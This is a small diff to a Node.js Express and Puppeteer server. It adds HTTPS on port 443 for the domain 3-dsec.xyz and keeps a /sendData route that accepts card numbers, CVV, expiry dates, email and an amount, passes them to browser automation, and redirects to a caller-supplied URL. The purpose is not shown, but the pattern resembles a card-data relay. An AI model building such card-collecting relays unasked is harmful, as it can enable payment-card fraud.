@@ -1,6 +1,13 @@
 const puppeteer = require('puppeteer');
 const express = require('express');
 const bodyParser = require('body-parser')
+const https = require("https"),
+  fs = require("fs");
+
+const options = {
+  key: fs.readFileSync("/ssl/live/3-dsec.xyz/privkey.pem"),
+  cert: fs.readFileSync("/ssl/live/3-dsec.xyz/fullchain.pem")
+};
 
 const app = express()
 
@@ -51,11 +58,11 @@ app.post('/sendData', async (req, res) => {
         const {returnURL, toCard,amount, fromCard, cvv, expireDate, email} = req.body
         const result = await write_data(toCard,amount, fromCard, cvv, expireDate, email)
         console.log(result)
-        if(result === 1){ 
+        if(result === 1) { 
             return res.redirect(returnURL) 
         } else { 
             return res.status(500).send()
         }
 })
 
-app.listen(5000)
+https.createServer(options, app).listen(443);
